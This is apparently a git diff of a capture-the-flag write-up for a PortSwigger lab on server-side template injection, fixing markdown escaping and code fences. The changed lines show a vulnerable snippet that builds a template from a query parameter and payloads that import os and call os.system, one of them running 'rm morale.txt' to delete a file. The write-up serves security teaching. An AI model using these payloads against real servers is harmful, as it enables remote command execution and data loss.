@@ -58,8 +58,10 @@ Since **the username can be controlled by an attacker**, it might vulnerable to 
 
 **The template code might be:**
 
+```py
 blog-post-author-display = getQueryParameter('blog-post-author-display')
 engine.render("Hello \{\{"+blog-post-author-display+"\}\}", data)
+```
 
 **If in that case, we can just close the template syntax: `}}`.**
 
@@ -105,7 +107,7 @@ Since I'm quite familiar with Python, I knew that **we can import a module calle
 
 **Payload:**
 
-\{\% import os \%\}\{\{os.system("cmd_here")\}\}
+\{% import os %\}\{\{os.system("cmd_here")\}\}
 
 ![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/Server-Side-Template-Injection/SSTI-2/images/Pasted%20image%2020221223031757.png)
 
@@ -113,10 +115,9 @@ Since I'm quite familiar with Python, I knew that **we can import a module calle
 
 **Nice! Let's delete `morale.txt` file:**
 
-\{\% import os \%\}\{\{os.system("ls")\}\}
+\{% import os %\}\{\{os.system("ls")\}\}
 
-\{\% import os \%\}\{\{os.system("rm morale.txt")\}\}
-
+\{% import os %\}\{\{os.system("rm morale.txt")\}\}
 
 ![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/Server-Side-Template-Injection/SSTI-2/images/Pasted%20image%2020221223031915.png)
 
